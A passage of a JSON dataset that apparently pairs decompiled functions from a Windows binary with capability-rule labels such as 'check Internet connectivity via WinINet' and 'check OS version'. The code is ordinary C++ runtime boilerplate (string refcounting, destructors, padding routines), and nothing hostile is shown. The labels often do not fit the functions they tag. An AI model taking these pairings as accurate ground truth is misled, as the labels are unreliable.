fcn.1400bcd60();\n        } while( true );\n    }\n    uVar8 = fcn.1400bc6e0(uVar4 * 2);\n    fcn.140023e10(&iStack64, uVar8, *(arg1 + 0x40), 0);\n    iVar10 = *piVar7;\n    if (*(iVar10 + 0x10) == 0x140061350) {\n        uVar6 = *(piVar7[2] + 0x48);\n    }\n    else {\n        uVar6 = (**(iVar10 + 0x10))(piVar7);\n        iVar10 = *piVar7;\n    }\n    *(arg1 + 0x48) = uVar6;\n    if (*(iVar10 + 0x18) == 0x140061360) {\n        uVar6 = *(piVar7[2] + 0x4a);\n    }\n    else {\n        uVar6 = (**(iVar10 + 0x18))(piVar7);\n    }\n    *(arg1 + 0x4a) = uVar6;\n    piVar7 = fcn.1400b9850(arg2);\n    (**(*piVar7 + 0x58))(piVar7, **0x14010fdc0, **0x14010fdc0 + 0x24, arg1 + 0x4c);\n    (**(*piVar7 + 0x58))(piVar7, **0x14010fdb0, **0x14010fdb0 + 0x1a, arg1 + 0x94);\n    *(arg1 + 0x10) = arg2_00;\n    *(arg1 + 0x28) = iVar9;\n    *(arg1 + 0x38) = uVar8;\n    *(arg1 + 200) = 1;\n    piVar1 = *0x14010fc90;\n    if (**0x14010fc90 == 0) {\n        iVar3 = *(iStack64 + -8);\n        *(iStack64 + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = iStack64 + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140072a10(iStack64 + -0x18);\n    }\n    if (*piVar1 == 0) {\n        iVar3 = *(iStack72 + -8);\n        *(iStack72 + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = iStack72 + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.140072a10(iStack72 + -0x18);\n    }\n    if (*piVar1 == 0) {\n        iVar3 = *(iStack80 + -8);\n        *(iStack80 + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack80 + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        return;\n    }\n    fcn.14007bf10(iStack80 + -0x18, &iStack64);\n    return;\n}\n",
        "token_count": 1803
    },
    "14009e48": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009e480(ulong *arg1)\n\n{\n    *arg1 = 0x140118600;\n    if (*(arg1 + 0x19) != '\\0') {\n        if (arg1[2] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[5] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[7] != 0) {\n            fcn.1400bc6b0();\n        }\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "14009fd6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14009fd60(int64_t arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong arg1_00;\n    ulong arg1_01;\n    ulong arg1_02;\n    ulong *puVar4;\n    bool bVar5;\n    uchar uVar6;\n    uint uVar7;\n    int64_t *piVar8;\n    ulong arg2_00;\n    ulong arg2_01;\n    ulong arg2_02;\n    char *arg2_03;\n    int64_t iVar9;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piVar8 = fcn.1400b95b0(arg2);\n    if (*(*piVar8 + 0x28) == 0x1400259f0) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x28);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.14007ba60(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x28))(aiStack80, piVar8);\n    }\n    arg1_00 = *(aiStack80[0] + -0x18);\n    arg2_00 = fcn.1400bc6e0(arg1_00);\n    fcn.140024ea0(aiStack80, arg2_00, arg1_00, 0);\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    if (*(*piVar8 + 0x30) == 0x140025ab0) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x38);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.14007ba60(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x30))(aiStack80, piVar8);\n    }\n    arg1_01 = *(aiStack80[0] + -0x18);\n    arg2_01 = fcn.1400bc6e0(arg1_01);\n    fcn.140024ea0(aiStack80, arg2_01, arg1_01, 0);\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    if (*(*piVar8 + 0x38) == 0x140025a60) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x48);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.14007ba60(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x38))(aiStack80, piVar8);\n    }\n    arg1_02 = *(aiStack80[0] + -0x18);\n    arg2_02 = fcn.1400bc6e0(arg1_02);\n    fcn.140024ea0(aiStack80, arg2_02, arg1_02, 0);\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    if (*(*piVar8 + 0x20) == 0x140025810) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x10);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.14007ba60(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x20))(aiStack80, piVar8);\n    }\n    iVar9 = *(aiStack80[0] + -0x18);\n    arg2_03 = fcn.1400bc6e0(iVar9);\n    fcn.140024ea0(aiStack80, arg2_03, iVar9, 0);\n    *(arg1 + 0x10) = arg2_03;\n    bVar5 = false;\n    *(arg1 + 0x18) = iVar9;\n    if (iVar9 != 0) {\n        bVar5 = *arg2_03 - 1U < 0x7e;\n    }\n    *(arg1 + 0x20) = bVar5;\n    if (*(*piVar8 + 0x10) == 0x140025a50) {\n        uVar6 = *(piVar8[2] + 0x21);\n    }\n    else {\n        uVar6 = (**(*piVar8 + 0x10))(piVar8);\n    }\n    *(arg1 + 0x21) = uVar6;\n    if (*(*piVar8 + 0x18) == 0x140025b00) {\n        uVar6 = *(piVar8[2] + 0x22);\n    }\n    else {\n        uVar6 = (**(*piVar8 + 0x18))(piVar8);\n    }\n    *(arg1 + 0x22) = uVar6;\n    iVar9 = *piVar8;\n    *(arg1 + 0x30) = arg1_00;\n    *(arg1 + 0x28) = arg2_00;\n    *(arg1 + 0x40) = arg1_01;\n    *(arg1 + 0x38) = arg2_01;\n    *(arg1 + 0x50) = arg1_02;\n    *(arg1 + 0x48) = arg2_02;\n    if (*(iVar9 + 0x40) == 0x140025a40) {\n        uVar7 = *(piVar8[2] + 0x58);\n    }\n    else {\n        uVar7 = (**(iVar9 + 0x40))(piVar8);\n        iVar9 = *piVar8;\n    }\n    *(arg1 + 0x58) = uVar7;\n    if (*(iVar9 + 0x48) == 0x1400258d0) {\n        uVar7 = *(piVar8[2] + 0x5c);\n    }\n    else {\n        uVar7 = (**(iVar9 + 0x48))(piVar8);\n    }\n    *(arg1 + 0x5c) = uVar7;\n    if (*(*piVar8 + 0x50) == 0x1400258c0) {\n        uVar7 = *(piVar8[2] + 0x60);\n    }\n    else {\n        uVar7 = (**(*piVar8 + 0x50))(piVar8);\n    }\n    *(arg1 + 0x60) = uVar7;\n    piVar8 = fcn.1400b97f0(arg2);\n    puVar4 = **0x14010fdf0;\n    if (*(piVar8 + 7) != '\\x01') {\n        if (*(piVar8 + 7) == '\\0') {\n            fcn.14002b2c0(piVar8);\n        }\n        if (*(*piVar8 + 0x38) != 0x14002ba80) {\n            (**(*piVar8 + 0x38))(piVar8, puVar4, puVar4 + 0xb, arg1 + 100);\n            goto code_r0x0001400a00ee;\n        }\n    }\n    *(arg1 + 100) = *puVar4;\n    *(arg1 + 0x6b) = *(puVar4 + 7);\ncode_r0x0001400a00ee:\n    piVar1 = *0x14010fc90;\n    *(arg1 + 0x6f) = 1;\n    if (*piVar1 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return;\n}\n",
        "token_count": 2316
    },
    "1400a04d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400a04d0(ulong *arg1)\n\n{\n    *arg1 = 0x140118850;\n    if (*(arg1 + 0x6f) != '\\0') {\n        if (arg1[2] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[5] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[7] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[9] != 0) {\n            fcn.1400bc6b0();\n        }\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "1400a059": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a0590(int64_t arg1, ulong arg2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong arg1_00;\n    ulong arg1_01;\n    ulong arg1_02;\n    ulong *puVar4;\n    bool bVar5;\n    uchar uVar6;\n    uint uVar7;\n    int64_t *piVar8;\n    ulong arg2_00;\n    ulong arg2_01;\n    ulong arg2_02;\n    char *arg2_03;\n    int64_t iVar9;\n    uchar uStack81;\n    int64_t aiStack80 [2];\n    \n    piVar8 = fcn.1400b9610(arg2);\n    if (*(*piVar8 + 0x28) == 0x140025e30) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x28);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.14007ba60(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x28))(aiStack80, piVar8);\n    }\n    arg1_00 = *(aiStack80[0] + -0x18);\n    arg2_00 = fcn.1400bc6e0(arg1_00);\n    fcn.140024ea0(aiStack80, arg2_00, arg1_00, 0);\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    if (*(*piVar8 + 0x30) == 0x140025ef0) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x38);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.14007ba60(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x30))(aiStack80, piVar8);\n    }\n    arg1_01 = *(aiStack80[0] + -0x18);\n    arg2_01 = fcn.1400bc6e0(arg1_01);\n    fcn.140024ea0(aiStack80, arg2_01, arg1_01, 0);\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    if (*(*piVar8 + 0x38) == 0x140025ea0) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x48);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.14007ba60(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x38))(aiStack80, piVar8);\n    }\n    arg1_02 = *(aiStack80[0] + -0x18);\n    arg2_02 = fcn.1400bc6e0(arg1_02);\n    fcn.140024ea0(aiStack80, arg2_02, arg1_02, 0);\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    if (*(*piVar8 + 0x20) == 0x140025c50) {\n        iVar9 = -1;\n        iVar3 = *(piVar8[2] + 0x10);\n        if (iVar3 != 0) {\n            iVar9 = sub.msvcrt.dll_strlen(iVar3);\n            iVar9 = iVar3 + iVar9;\n        }\n        aiStack80[0] = fcn.14007ba60(iVar3, iVar9);\n    }\n    else {\n        (**(*piVar8 + 0x20))(aiStack80, piVar8);\n    }\n    iVar9 = *(aiStack80[0] + -0x18);\n    arg2_03 = fcn.1400bc6e0(iVar9);\n    fcn.140024ea0(aiStack80, arg2_03, iVar9, 0);\n    *(arg1 + 0x10) = arg2_03;\n    bVar5 = false;\n    *(arg1 + 0x18) = iVar9;\n    if (iVar9 != 0) {\n        bVar5 = *arg2_03 - 1U < 0x7e;\n    }\n    *(arg1 + 0x20) = bVar5;\n    if (*(*piVar8 + 0x10) == 0x140025e90) {\n        uVar6 = *(piVar8[2] + 0x21);\n    }\n    else {\n        uVar6 = (**(*piVar8 + 0x10))(piVar8);\n    }\n    *(arg1 + 0x21) = uVar6;\n    if (*(*piVar8 + 0x18) == 0x140025f40) {\n        uVar6 = *(piVar8[2] + 0x22);\n    }\n    else {\n        uVar6 = (**(*piVar8 + 0x18))(piVar8);\n    }\n    *(arg1 + 0x22) = uVar6;\n    iVar9 = *piVar8;\n    *(arg1 + 0x30) = arg1_00;\n    *(arg1 + 0x28) = arg2_00;\n    *(arg1 + 0x40) = arg1_01;\n    *(arg1 + 0x38) = arg2_01;\n    *(arg1 + 0x50) = arg1_02;\n    *(arg1 + 0x48) = arg2_02;\n    if (*(iVar9 + 0x40) == 0x140025e80) {\n        uVar7 = *(piVar8[2] + 0x58);\n    }\n    else {\n        uVar7 = (**(iVar9 + 0x40))(piVar8);\n        iVar9 = *piVar8;\n    }\n    *(arg1 + 0x58) = uVar7;\n    if (*(iVar9 + 0x48) == 0x140025d10) {\n        uVar7 = *(piVar8[2] + 0x5c);\n    }\n    else {\n        uVar7 = (**(iVar9 + 0x48))(piVar8);\n    }\n    *(arg1 + 0x5c) = uVar7;\n    if (*(*piVar8 + 0x50) == 0x140025d00) {\n        uVar7 = *(piVar8[2] + 0x60);\n    }\n    else {\n        uVar7 = (**(*piVar8 + 0x50))(piVar8);\n    }\n    *(arg1 + 0x60) = uVar7;\n    piVar8 = fcn.1400b97f0(arg2);\n    puVar4 = **0x14010fdf0;\n    if (*(piVar8 + 7) != '\\x01') {\n        if (*(piVar8 + 7) == '\\0') {\n            fcn.14002b2c0(piVar8);\n        }\n        if (*(*piVar8 + 0x38) != 0x14002ba80) {\n            (**(*piVar8 + 0x38))(piVar8, puVar4, puVar4 + 0xb, arg1 + 100);\n            goto code_r0x0001400a091e;\n        }\n    }\n    *(arg1 + 100) = *puVar4;\n    *(arg1 + 0x6b) = *(puVar4 + 7);\ncode_r0x0001400a091e:\n    piVar1 = *0x14010fc90;\n    *(arg1 + 0x6f) = 1;\n    if (*piVar1 == 0) {\n        iVar2 = *(aiStack80[0] + -8);\n        *(aiStack80[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack80[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (iVar2 < 1) {\n        fcn.14007bf10(aiStack80[0] + -0x18, &uStack81);\n    }\n    return;\n}\n",
        "token_count": 2314
    },
    "1400a0d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400a0d00(ulong *arg1)\n\n{\n    *arg1 = 0x140118870;\n    if (*(arg1 + 0x6f) != '\\0') {\n        if (arg1[2] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[5] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[7] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[9] != 0) {\n            fcn.1400bc6b0();\n        }\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "1400a152": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400a1520(ulong *arg1)\n\n{\n    *arg1 = 0x140118890;\n    if (*(arg1 + 0x7a) != '\\0') {\n        if (arg1[2] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[5] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[7] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[9] != 0) {\n            fcn.1400bc6b0();\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "1400a1d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400a1d40(ulong *arg1)\n\n{\n    *arg1 = 0x1401188b0;\n    if (*(arg1 + 0x7a) != '\\0') {\n        if (arg1[2] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[5] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[7] != 0) {\n            fcn.1400bc6b0();\n        }\n        if (arg1[9] != 0) {\n            fcn.1400bc6b0();\n        }\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "1400a210": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400a2100(int64_t arg1, ulong arg2, char *arg3, char *arg4)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int64_t *arg1_00;\n    char *pcVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    char *pcVar7;\n    int64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    \n    uVar3 = *(arg1 + 0x18) & 0xb0;\n    iVar5 = in_stack_00000028 - in_stack_00000030;\n    if (uVar3 == 0x20) {\n        if (in_stack_00000030 != 0) {\n            sub.msvcrt.dll_memcpy(arg3, arg4, in_stack_00000030);\n        }\n        if (iVar5 == 0) {\n            return;\n        }\n    // WARNING: Could not recover jumptable at 0x00014001e570. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_memset)(arg3 + in_stack_00000030, arg2, iVar5);\n        return;\n    }\n    pcVar4 = arg3;\n    pcVar7 = arg4;\n    if (uVar3 == 0x10) {\n        arg1_00 = fcn.1400b97f0(arg1 + 0xd0);\n        if (*(arg1_00 + 7) == '\\0') {\n            fcn.14002b2c0(arg1_00);\n            cVar2 = '-';\n            if (*(*arg1_00 + 0x30) != 0x14002bab0) {\n                cVar2 = (**(*arg1_00 + 0x30))(arg1_00);\n            }\n            cVar1 = *arg4;\n            if (cVar1 != cVar2) {\n                if (*(arg1_00 + 7) != '\\0') goto code_r0x0001400a2214;\n                fcn.14002b2c0(arg1_00);\n                cVar2 = '+';\n                if (*(*arg1_00 + 0x30) != 0x14002bab0) {\n                    cVar2 = (**(*arg1_00 + 0x30))(arg1_00);\n                }\n                cVar1 = *arg4;\n                if (cVar1 != cVar2) {\n                    if (*(arg1_00 + 7) != '\\0') goto code_r0x0001400a221f;\n                    fcn.14002b2c0(arg1_00);\n                    cVar2 = '0';\n                    if (*(*arg1_00 + 0x30) != 0x14002bab0) {\n                        cVar2 = (**(*arg1_00 + 0x30))(arg1_00);\n                    }\n                    if ((*arg4 != cVar2) || (in_stack_00000030 < 2)) goto code_r0x0001400a2144;\n                    if (*(arg1_00 + 7) != '\\0') goto code_r0x0001400a2234;\n                    fcn.14002b2c0(arg1_00);\n                    cVar2 = 'x';\n                    if (*(*arg1_00 + 0x30) != 0x14002bab0) {\n                        cVar2 = (**(*arg1_00 + 0x30))(arg1_00);\n                    }\n                    cVar1 = arg4[1];\n                    if (cVar1 != cVar2) {\n                        if (*(arg1_00 + 7) != '\\0') goto code_r0x0001400a2247;\n                        cVar2 = fcn.14002b9d0(arg1_00, 0x58);\n                        cVar1 = arg4[1];\n                        goto code_r0x0001400a2250;\n                    }\n                    goto code_r0x0001400a23a0;\n                }\n            }\ncode_r0x0001400a22d0:\n            *arg3 = cVar2;\n            pcVar7 = arg4 + 1;\n            pcVar4 = arg3 + 1;\n            iVar6 = 1;\n            goto code_r0x0001400a2147;\n        }\n        cVar1 = *arg4;\n        cVar2 = cVar1;\n        if (*(arg1_00 + 0x66) == cVar1) goto code_r0x0001400a22d0;\ncode_r0x0001400a2214:\n        cVar2 = cVar1;\n        if (*(arg1_00 + 100) == cVar1) goto code_r0x0001400a22d0;\ncode_r0x0001400a221f:\n        if ((*(arg1_00 + 0x69) != cVar1) || (in_stack_00000030 < 2)) goto code_r0x0001400a2144;\ncode_r0x0001400a2234:\n        cVar1 = arg4[1];\n        if (*(arg1_00 + 0xb1) == cVar1) {\ncode_r0x0001400a23a0:\n            pcVar4 = arg3 + 2;\n            pcVar7 = arg4 + 2;\n            iVar6 = 2;\n            *arg3 = *arg4;\n            arg3[1] = arg4[1];\n            goto code_r0x0001400a2147;\n        }\ncode_r0x0001400a2247:\n        cVar2 = *(arg1_00 + 0x91);\ncode_r0x0001400a2250:\n        if (cVar2 == cVar1) goto code_r0x0001400a23a0;\n        if (iVar5 == 0) goto code_r0x00014001e560;\n        iVar6 = 0;\ncode_r0x0001400a216c:\n        sub.msvcrt.dll_memset(pcVar4, arg2, iVar5);\n        arg4 = pcVar7;\n    }\n    else {\ncode_r0x0001400a2144:\n        iVar6 = 0;\ncode_r0x0001400a2147:\n        arg4 = pcVar7;\n        if (iVar5 != 0) goto code_r0x0001400a216c;\n    }\n    in_stack_00000030 = in_stack_00000030 - iVar6;\n    if (in_stack_00000030 == 0) {\n        return;\n    }\n    arg3 = pcVar4 + iVar5;\ncode_r0x00014001e560:\n    // WARNING: Could not recover jumptable at 0x00014001e560. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_memcpy)(arg3, arg4, in_stack_00000030);\n    return;\n}\n",
        "token_count": 1550
    },
    "1400a23f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1400a23f0(int64_t arg1, ulong arg2, int16_t *arg3, int16_t *arg4)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int16_t *piVar7;\n    int16_t *piVar8;\n    int64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    \n    uVar2 = *(arg1 + 0x18) & 0xb0;\n    iVar6 = in_stack_00000028 - in_stack_00000030;\n    if (uVar2 == 0x20) {\n        if (in_stack_00000030 != 0) {\n            sub.msvcrt.dll_memcpy(arg3, arg4, in_stack_00000030 * 2);\n        }\n        iVar5 = 0;\n        if (iVar6 == 0) {\n            return;\n        }\n        do {\n            arg3[in_stack_00000030 + iVar5] = arg2;\n            if (iVar6 == iVar5 + 1) {\n                return;\n            }\n            arg3[in_stack_00000030 + iVar5 + 1] = arg2;\n            iVar5 = iVar5 + 2;\n        } while (iVar6 != iVar5);\n        return;\n    }\n    if (uVar2 == 0x10) {\n        piVar4 = fcn.1400b9850(arg1 + 0xd0);\n        iVar1 = (**(*piVar4 + 0x50))(piVar4, 0x2d);\n        if ((*arg4 == iVar1) || (iVar1 = (**(*piVar4 + 0x50))(piVar4, 0x2b),  *arg4 == iVar1)) {\n            *arg3 = iVar1;\n            piVar8 = arg4 + 1;\n            piVar7 = arg3 + 1;\n            iVar5 = 1;\n            goto code_r0x0001400a2434;\n        }\n        iVar1 = (**(*piVar4 + 0x50))(piVar4);\n        if ((*arg4 != iVar1) || (in_stack_00000030 < 2)) goto code_r0x0001400a2432;\n        iVar1 = (**(*piVar4 + 0x50))(piVar4, 0x78);\n        if ((arg4[1] == iVar1) || (iVar1 = (**(*piVar4 + 0x50))(piVar4),  arg4[1] == iVar1)) {\n            piVar7 = arg3 + 2;\n            piVar8 = arg4 + 2;\n            iVar5 = 2;\n            *arg3 = *arg4;\n            arg3[1] = arg4[1];\n            goto code_r0x0001400a2434;\n        }\n        iVar5 = 0;\n        if (iVar6 == 0) goto code_r0x00014001e560;\ncode_r0x0001400a2439:\n        iVar3 = 0;\n        do {\n            arg3[iVar3] = arg2;\n            iVar3 = iVar3 + 1;\n        } while (iVar6 != iVar3);\n    }\n    else {\ncode_r0x0001400a2432:\n        iVar5 = 0;\n        piVar7 = arg3;\n        piVar8 = arg4;\ncode_r0x0001400a2434:\n        arg3 = piVar7;\n        arg4 = piVar8;\n        if (iVar6 != 0) goto code_r0x0001400a2439;\n    }\n    in_stack_00000030 = in_stack_00000030 - iVar5;\n    if (in_stack_00000030 == 0) {\n        return;\n    }\n    arg3 = arg3 + iVar6;\ncode_r0x00014001e560:\n    // WARNING: Could not recover jumptable at 0x00014001e560. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_memcpy)(arg3, arg4, in_stack_00000030 * 2);\n    return;\n}\n",
        "token_count": 946
    },
    "1400a29d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400a29d0(void)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    ulong *puVar3;\n    \n    if (**0x14010fc90 == 0) {\n        iVar1 = **0x14010ff50;\n        piVar2 = *0x14010ff50;\n    }\n    else {\n        fcn.1400147f0(*0x14010ff80, 0x1400a2a60);\n        iVar1 = **0x14010ff50;\n        piVar2 = *0x14010ff50;\n    }\n    if (iVar1 != 0) {\n        *0x14010ff50 = piVar2;\n        return;\n    }\n    *0x14010ff50 = piVar2;\n    fcn.1400a4630(0x140106ac0, 2);\n    puVar3 = *0x14010ff90;\n    *piVar2 = 0x140106ac0;\n    *puVar3 = 0x140106ac0;\n    *0x140107800 = 0x140106ac0;\n    return;\n}\n",
        "token_count": 258
    },
    "1400a38f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
